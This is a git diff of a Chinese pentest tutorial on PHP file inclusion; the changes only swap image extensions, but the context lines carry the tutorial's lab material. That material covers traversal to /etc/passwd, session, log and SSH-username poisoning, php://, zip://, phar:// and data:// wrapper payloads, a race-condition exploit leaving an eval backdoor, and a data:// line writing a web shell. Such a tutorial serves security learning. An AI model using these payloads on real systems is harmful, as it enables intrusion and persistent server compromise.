@@ -98,11 +98,11 @@ $\_GET\['filename']参数开发者没有经过严格的过滤，直接带入了i
 
 ### **测试结果**
 
-![](<../../.gitbook/assets/image (502).png>)
+![](<../../.gitbook/assets/image (502).webp>)
 
 如果包含的文件内容不符合php语言语法的，会直接将文件内容输出，比如：
 
-![](<../../.gitbook/assets/image (591).png>)
+![](<../../.gitbook/assets/image (591).webp>)
 
 ### **目录遍历**
 
@@ -115,13 +115,13 @@ include(/web.$file);   //如果有web目录可以用../上一级目录绕过限�
 
 `./` 当前目录 `../` 上一级目录,这样的遍历目录来读取文件
 
-![](<../../.gitbook/assets/image (576).png>)
+![](<../../.gitbook/assets/image (576).webp>)
 
 ### **7.1文件包含配置文件**
 
 包含一些敏感的配置文件，获取目标敏感信息
 
-![](<../../.gitbook/assets/image (352).png>)
+![](<../../.gitbook/assets/image (352).webp>)
 
 **常见的敏感信息路径：**
 
@@ -183,15 +183,15 @@ include(/web.$file);   //如果有web目录可以用../上一级目录绕过限�
 
 windows默认C:\WINDOWS\Temp或集成环境下的tmp文件夹里
 
-![](<../../.gitbook/assets/image (492).png>)
+![](<../../.gitbook/assets/image (492).webp>)
 
 Linux下默认存放在/var/lib/php/session目录下
 
-![](<../../.gitbook/assets/image (481).png>)
+![](<../../.gitbook/assets/image (481).webp>)
 
 获取方法2：猜测默认的session存放位置
 
-![](<../../.gitbook/assets/image (521).png>)
+![](<../../.gitbook/assets/image (521).webp>)
 
 session中的内容可以被控制，传入恶意代码。
 
@@ -212,13 +212,13 @@ $_SESSION["username"]=$ctfs;
 
 session的文件名为sess\_+sessionid，sessionid可以通过开发者模式获取。
 
-![](<../../.gitbook/assets/image (529).png>)
+![](<../../.gitbook/assets/image (529).webp>)
 
 所以session的文件名为：5ba03eaaa1b81759bbd60937fe821215
 
 到服务器的D:\phpStudy\PHPTutorial\tmp\tmp目录下查看果然存在此文件，内容为：
 
-![](<../../.gitbook/assets/image (467).png>)
+![](<../../.gitbook/assets/image (467).webp>)
 
 **漏洞利用**
 
@@ -226,15 +226,15 @@ session的文件名为sess\_+sessionid，sessionid可以通过开发者模式获
 
 当访问http://127.0.0.1/session.php?ctfs=\<?php phpinfo();?>后，会在D:\phpStudy\PHPTutorial\tmp\tmp目录下存储session的值。
 
-![](<../../.gitbook/assets/image (656).png>)
+![](<../../.gitbook/assets/image (656).webp>)
 
 攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。
 
-![](<../../.gitbook/assets/image (642).png>)
+![](<../../.gitbook/assets/image (642).webp>)
 
 **Getshell思路**
 
-![](<../../.gitbook/assets/image (542).png>)
+![](<../../.gitbook/assets/image (542).webp>)
 
 **扩展**
 
@@ -321,13 +321,13 @@ Windows和linux的路径不一样，但是也有默认的路径
 
 phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vhosts.conf
 
-![](<../../.gitbook/assets/image (514).png>)
+![](<../../.gitbook/assets/image (514).webp>)
 
 **二.测试是否可以文件包含**
 
 [http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log](http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log) &#x20;
 
-![](<../../.gitbook/assets/image (610).png>)
+![](<../../.gitbook/assets/image (610).webp>)
 
 包含错误日志： ?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）
 
@@ -343,15 +343,15 @@ phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vho
 
 利用Burp进行抓包直接把代码写进去
 
-![](<../../.gitbook/assets/image (631).png>)
+![](<../../.gitbook/assets/image (631).webp>)
 
 再去访问包含日志文件
 
-![](<../../.gitbook/assets/image (479).png>)
+![](<../../.gitbook/assets/image (479).webp>)
 
 **Getshell**
 
-![](<../../.gitbook/assets/image (412).png>)
+![](<../../.gitbook/assets/image (412).webp>)
 
 **总结**
 
@@ -363,7 +363,7 @@ phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vho
 
 可以尝试利用 UA 插入 payload 到日志文件
 
-![](<../../.gitbook/assets/image (441).png>)
+![](<../../.gitbook/assets/image (441).webp>)
 
 
 
@@ -380,7 +380,7 @@ set srvport 8888
 exploit -z
 ```
 
-![](<../../.gitbook/assets/image (451).png>)
+![](<../../.gitbook/assets/image (451).webp>)
 
 参考文章
 
@@ -410,31 +410,31 @@ ssh '<?php phpinfo();?>'@192.168.136.143
 
 这样把用户名写成phpinfo，ssh的登陆日志就会把此次的登陆行为记录到日志中，利用包含漏洞getshell
 
-![](<../../.gitbook/assets/image (568).png>)
+![](<../../.gitbook/assets/image (568).webp>)
 
 可以看到我们登陆的行为都被记录到了日志当中
 
-![](<../../.gitbook/assets/image (526).png>)
+![](<../../.gitbook/assets/image (526).webp>)
 
 可以看到刚才登陆的时候，成功phpinfo写入到日志文件中并且成功解析
 
-![](<../../.gitbook/assets/image (300).png>)
+![](<../../.gitbook/assets/image (300).webp>)
 
 通过phpinfo查看到了网站根目录
 
-![](<../../.gitbook/assets/image (608).png>)
+![](<../../.gitbook/assets/image (608).webp>)
 
 本来想着利用文件包含漏洞配合fputs和fopen函数在网站根目录写入一句话木马getshell，但是由于单引号太多就报错了，只能另谋出路
 
-![](<../../.gitbook/assets/image (503).png>)
+![](<../../.gitbook/assets/image (503).webp>)
 
 然后就想到了把执行命令的一句话木马写入日志，利用文件包含执行反弹shell
 
-![](<../../.gitbook/assets/image (447).png>)
+![](<../../.gitbook/assets/image (447).webp>)
 
 然后构造请求执行命令，因为刚才我写进去的是通过GET方式用panda参数传参，多个参数之间用&符号连接，还是要注意，命令要url编码再执行
 
-![](<../../.gitbook/assets/image (553).png>)
+![](<../../.gitbook/assets/image (553).webp>)
 
 参考文章
 
@@ -452,11 +452,11 @@ select '<?php phpinfo();?>'
 
 打开`F12`查看到`session`名，完整的`session`文件就是`sess_session`名
 
-![](<../../.gitbook/assets/image (641).png>)
+![](<../../.gitbook/assets/image (641).webp>)
 
 `phpstudy`里面默认`session`存储位置是`phpstudy`下`tmp/tmp`，于是包含该`session`文件
 
-![](<../../.gitbook/assets/image (330).png>)
+![](<../../.gitbook/assets/image (330).webp>)
 
 参考文章
 
@@ -502,33 +502,33 @@ phpMyAdmin CVE-2018-12613<br>
 
 {% embed url="http://192.168.136.128:8080/lfi.php?file=/etc/passwd" %}
 
-![](<../../.gitbook/assets/image (1051).png>)
+![](<../../.gitbook/assets/image (1051).webp>)
 
 访问phpinfo页面，确实存在
 
-![](<../../.gitbook/assets/image (483).png>)
+![](<../../.gitbook/assets/image (483).webp>)
 
 然后利用网上的exp进行利用：
 
 python2 exp.py 目标ip 8080 100
 
-![](<../../.gitbook/assets/image (389).png>)
+![](<../../.gitbook/assets/image (389).webp>)
 
 在189次请求时，就写入成功了
 
 脚本exp.py实现了上述过程，成功包含临时文件后，会利用file\_put\_contents函数写入\<?=eval($\_REQUEST\[1])?>一句话后门到/tmp/g文件中，这个文件会永久留在目标机器上
 
-![](<../../.gitbook/assets/image (263).png>)
+![](<../../.gitbook/assets/image (263).webp>)
 
 然后直接利用蚁剑进行连接即可，密码为1：
 
-![](<../../.gitbook/assets/image (536).png>)
+![](<../../.gitbook/assets/image (536).webp>)
 
 ### **7.10包含 /proc/self/environ 文件**
 
 Linux下有一个文件/proc/self/environ，这个文件里保存了系统的一些变量。
 
-![](<../../.gitbook/assets/image (509).png>)
+![](<../../.gitbook/assets/image (509).webp>)
 
 利用条件：
 
@@ -564,7 +564,7 @@ proc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 p
 
 ### **7.11 文件包含案例**
 
-![](<../../.gitbook/assets/image (246).png>)
+![](<../../.gitbook/assets/image (246).webp>)
 
 ## 8、本地文件包含绕过
 
@@ -612,7 +612,7 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 
 &#x20;\`\` http://127.0.0.1/include.php?file=../phpinfo.php%00&#x20;
 
-![](<../../.gitbook/assets/image (640).png>)
+![](<../../.gitbook/assets/image (640).webp>)
 
 ### **8.2 路径长度截断：**
 
@@ -667,11 +667,11 @@ include $a;
 
 访问：[http://127.0.0.1/include.php?page=http://127.0.0.1/2.jpg?](http://127.0.0.1/include.php?page=http://127.0.0.1/2.jpg?)  如图所示：
 
-![](<../../.gitbook/assets/image (572).png>)
+![](<../../.gitbook/assets/image (572).webp>)
 
 或者
 
-![](<../../.gitbook/assets/image (575).png>)
+![](<../../.gitbook/assets/image (575).webp>)
 
 ### **8.4编码绕过**
 
@@ -718,7 +718,7 @@ include $a;
 
 如下所示：
 
-![](<../../.gitbook/assets/image (490).png>)
+![](<../../.gitbook/assets/image (490).webp>)
 
 这是我的PHP5.6版本的远程设备信息，目标设备是5.2版本。
 
@@ -730,27 +730,27 @@ include $a;
 
 此时，远程服务器会执行此代码的源代码，如下所示：
 
-![](<../../.gitbook/assets/image (450).png>)
+![](<../../.gitbook/assets/image (450).webp>)
 
 所以为了使这个攻击开始运行，你需要做一些修改：
 
 1、修改配置
 
-![](<../../.gitbook/assets/image (463).png>)
+![](<../../.gitbook/assets/image (463).webp>)
 
 2、修改文件后缀
 
-![](<../../.gitbook/assets/image (333).png>)
+![](<../../.gitbook/assets/image (333).webp>)
 
 此时，你可以再来尝试一下包含的攻击向量：
 
-![](<../../.gitbook/assets/image (554).png>)
+![](<../../.gitbook/assets/image (554).webp>)
 
 那么你可以看到所需的信息在此包含之后返回，并且你的目标设备信息不再改变。
 
 接下来，你要再次为远程文件包含做一个shell示例。
 
-![](<../../.gitbook/assets/image (589).png>)
+![](<../../.gitbook/assets/image (589).webp>)
 
 远程文件包含使用的前提是，符合本地文件包含的前提并符合远程文件包含其可用性的前提。
 
@@ -792,7 +792,7 @@ include($_GET['filename'] . ".html");
 http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?
 ```
 
-![](<../../.gitbook/assets/image (469).png>)
+![](<../../.gitbook/assets/image (469).webp>)
 
 
 
@@ -802,17 +802,17 @@ http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?
 http://www.127.0.0.1.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23
 ```
 
-![](<../../.gitbook/assets/image (670).png>)
+![](<../../.gitbook/assets/image (670).webp>)
 
 ### **11.3  还有哪些可以绕？**
 
 用burp跑一遍发现空格也可以绕过：
 
-![](<../../.gitbook/assets/image (657).png>)
+![](<../../.gitbook/assets/image (657).webp>)
 
 %20
 
-![](<../../.gitbook/assets/image (647).png>)
+![](<../../.gitbook/assets/image (647).webp>)
 
 ## 12、**文件包含漏洞的利用方式-伪协议**
 
@@ -907,7 +907,7 @@ allow_url_include：off/on
 
 &#x20;· http://127.0.0.1/1.php?x=file://D://phpinfo.txt   &#x20;
 
-![](<../../.gitbook/assets/image (482).png>)
+![](<../../.gitbook/assets/image (482).webp>)
 
 ### 12.3 php://协议 输入/输出流（I/O streams）
 
@@ -984,7 +984,7 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 
 这样就可以获取phpinfo页面说明代码成功执行了 我们要获取flag
 
-![](<../../.gitbook/assets/image (289).png>)
+![](<../../.gitbook/assets/image (289).webp>)
 
 
 
@@ -994,7 +994,7 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 <?php system("dir"); ?>
 ```
 
-![](<../../.gitbook/assets/image (364).png>)
+![](<../../.gitbook/assets/image (364).webp>)
 
 
 
@@ -1011,7 +1011,7 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 //如果一句话木马内容为双引号那么不会成功执行
 ```
 
-![](<../../.gitbook/assets/image (653).png>)
+![](<../../.gitbook/assets/image (653).webp>)
 
 
 
@@ -1127,11 +1127,11 @@ test5</html>
 
 * 打开地址 点击一下  [click me? no](http://127.0.0.1/1/index.php?file=show.php) &#x20;
 
-![](<../../.gitbook/assets/image (539).png>)
+![](<../../.gitbook/assets/image (539).webp>)
 
 直接跳到 http://127.0.0.1/1/index.php?file=show.php 从URL得到出file传参包含得到show.php
 
-![](<../../.gitbook/assets/image (615).png>)
+![](<../../.gitbook/assets/image (615).webp>)
 
 * 使用伪协议php://filter base64编码进行包含index.php
 
@@ -1139,7 +1139,7 @@ test5</html>
 http://127.0.0.1/1/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
 ```
 
-![](<../../.gitbook/assets/image (749).png>)
+![](<../../.gitbook/assets/image (749).webp>)
 
 * 得到base64编码
 
@@ -1163,7 +1163,7 @@ file_put_contents($code,"test");
 
 ·  http://127.0.0.1/5.php?a=php://output  &#x20;
 
-![](<../../.gitbook/assets/image (464).png>)
+![](<../../.gitbook/assets/image (464).webp>)
 
 
 
@@ -1205,7 +1205,7 @@ php 版本大于等于 php5.3.0
 
 * 创建一个uploads文件夹
 
-![](<../../.gitbook/assets/image (403).png>)
+![](<../../.gitbook/assets/image (403).webp>)
 
 
 
@@ -1263,13 +1263,13 @@ if( isset( $_FILES['fupload'] ) ) {
 
 * 点击upload？直接跳转
 
-![](<../../.gitbook/assets/image (593).png>)
+![](<../../.gitbook/assets/image (593).webp>)
 
 * 跳转到文件上传功能上 题目思路上传文件再利用压缩包协议进行包含获取webshell
 
 从上传分析只能上传jpg，png，zip.....
 
-![](<../../.gitbook/assets/image (284).png>)
+![](<../../.gitbook/assets/image (284).webp>)
 
 * 上传一个压缩包里面包含php的文件 并且得到了绝对路径
 * 利用zip协议进行包含并且加上%23和压缩包里面文件（如果不用%23而用#后面的文件是被忽略）
@@ -1278,25 +1278,25 @@ if( isset( $_FILES['fupload'] ) ) {
 ?file=zip://D:\phpstudy_pro\WWW\CTF\3\uploads\8a10fd88e3ab15c68d1596b0b4377816.zip%23test.php
 ```
 
-![](<../../.gitbook/assets/image (406).png>)
+![](<../../.gitbook/assets/image (406).webp>)
 
 访问失败 因为在代码中是拼接了一个php
 
-![](<../../.gitbook/assets/image (265).png>)
+![](<../../.gitbook/assets/image (265).webp>)
 
 在访问的时候去掉“ .php ”就可以了
 
-![](<../../.gitbook/assets/image (654).png>)
+![](<../../.gitbook/assets/image (654).webp>)
 
 如果把压缩包改成“jpg”是否还可以通过zip协议识别包含
 
-![](<../../.gitbook/assets/image (586).png>)
+![](<../../.gitbook/assets/image (586).webp>)
 
 ```
 http://127.0.0.1/ctf/3/php_zip.php?file=zip://D:\phpstudy_pro\WWW\CTF\3\uploads\8a10fd88e3ab15c68d1596b0b4377816.jpg#test
 ```
 
-![](<../../.gitbook/assets/image (595).png>)
+![](<../../.gitbook/assets/image (595).webp>)
 
 说明zip协议不会校验后台的名称，不管是jpg还是png等等都会当成zip文件
 
@@ -1318,7 +1318,7 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 
 `` ` http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Desktop/test.jpg ``
 
-![](<../../.gitbook/assets/image (443).png>)
+![](<../../.gitbook/assets/image (443).webp>)
 
 **zlib://协议**
 
@@ -1330,7 +1330,7 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 
 `` ` http://127.0.0.1/xxx.php?a=compress.zlib://file.gz ``&#x20;
 
-![](<../../.gitbook/assets/image (598).png>)
+![](<../../.gitbook/assets/image (598).webp>)
 
 
 
@@ -1339,7 +1339,7 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 <?php phpinfo(); ?>
 ```
 
-![](<../../.gitbook/assets/image (606).png>)
+![](<../../.gitbook/assets/image (606).webp>)
 
 **扩展**
 
@@ -1364,7 +1364,7 @@ if (!$file) echo '<a href="?file=upload">upload?</a>';
 
 phar://中相对路径和绝对路径都可以使用
 
-![](<../../.gitbook/assets/image (648).png>)
+![](<../../.gitbook/assets/image (648).webp>)
 
 ### 12.8 php-date
 
@@ -1392,7 +1392,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 ?file=data://text/plain,<?php phpinfo();?>
 ```
 
-![](<../../.gitbook/assets/image (519).png>)
+![](<../../.gitbook/assets/image (519).webp>)
 
 
 
@@ -1402,7 +1402,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
 ```
 
-![](<../../.gitbook/assets/image (449).png>)
+![](<../../.gitbook/assets/image (449).webp>)
 
 
 
@@ -1412,7 +1412,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
 ```
 
-![](<../../.gitbook/assets/image (518).png>)
+![](<../../.gitbook/assets/image (518).webp>)
 
 
 
@@ -1422,7 +1422,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==
 ```
 
-![](<../../.gitbook/assets/image (275).png>)
+![](<../../.gitbook/assets/image (275).webp>)
 
 
 
@@ -1432,7 +1432,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 ?file=data://text/plain,<?php fputs(fopen("shell.php","w"),'<?php eval($_POST[cmd]);?>');?>
 ```
 
-![](<../../.gitbook/assets/image (11).png>)
+![](<../../.gitbook/assets/image (11).webp>)
 
 ## 13、
 
@@ -1456,11 +1456,11 @@ if(isset($_GET['x']))
 
 接着利用网站的上传功能上传文件
 
-![](<../../.gitbook/assets/image (655).png>)
+![](<../../.gitbook/assets/image (655).webp>)
 
 攻击payload:  \`  http://atest.test/2.php?x=zip://111.zip%231&#x20;
 
-![](<../../.gitbook/assets/image (413).png>)
+![](<../../.gitbook/assets/image (413).webp>)
 
 ### 13.2 绕过方法二 - zip协议
 
@@ -1472,7 +1472,7 @@ if(isset($_GET['x']))
 
 攻击payload:  http://atest.test/2.php?x=zip://111.jpg%231&#x20;
 
-![](<../../.gitbook/assets/image (577).png>)
+![](<../../.gitbook/assets/image (577).webp>)
 
 ### 13.3 绕过方法三 - phar协议
 
@@ -1503,7 +1503,7 @@ if(isset($_GET['x']))
 
 将\<?php phpinfo();?>改变成url编码
 
-![](<../../.gitbook/assets/image (358).png>)
+![](<../../.gitbook/assets/image (358).webp>)
 
 
 
